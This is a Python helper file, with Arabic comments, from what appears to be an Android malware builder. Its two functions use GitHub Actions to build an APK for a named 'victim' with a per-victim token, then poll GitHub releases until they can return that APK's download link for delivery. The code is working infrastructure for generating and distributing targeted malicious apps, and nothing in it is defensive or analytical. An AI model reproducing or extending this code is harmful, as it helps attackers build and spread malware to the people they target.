# utils.py
# ============================================================
# دوال مساعدة — GitHub build + helper
# ============================================================

import time
import requests
from config import GITHUB_TOKEN, GITHUB_REPO, GITHUB_WORKFLOW_FILE


def trigger_victim_apk_build(victim_token, victim_name):
    """يشغّل GitHub Actions لبناء APK للضحية"""
    if not GITHUB_TOKEN:
        print("[-] GITHUB_TOKEN not set")
        return False
    try:
        url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/{GITHUB_WORKFLOW_FILE}/dispatches"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
        }
        payload = {
            "ref": "main",
            "inputs": {
                "victim_token": victim_token,
                "victim_name": victim_name,
            }
        }
        r = requests.post(url, headers=headers, json=payload, timeout=15)
        if r.status_code in [204, 200]:
            print(f"[+] Build triggered: {victim_name}")
            return True
        else:
            print(f"[-] Build failed: {r.status_code} - {r.text[:200]}")
            return False
    except Exception as e:
        print(f"[-] trigger error: {e}")
        return False


def get_victim_apk_url(victim_token, max_wait=900):
    """ينتظر بناء APK ويرجع رابطه"""
    if not GITHUB_TOKEN:
        return None
    start = time.time()
    short_token = victim_token[:16]
    print(f"[+] Waiting for APK: {short_token}")
    while time.time() - start < max_wait:
        try:
            url = f"https://api.github.com/repos/{GITHUB_REPO}/releases?per_page=15"
            headers = {
                "Authorization": f"token {GITHUB_TOKEN}",
                "Accept": "application/vnd.github.v3+json",
            }
            r = requests.get(url, headers=headers, timeout=15)
            if r.status_code == 200:
                for release in r.json():
                    name = release.get("name", "")
                    tag = release.get("tag_name", "")
                    if short_token in name or short_token in tag:
                        for asset in release.get("assets", []):
                            if asset.get("name", "").endswith(".apk"):
                                return asset.get("browser_download_url")
        except Exception as e:
            print(f"[-] check error: {e}")
        time.sleep(15)
    return None
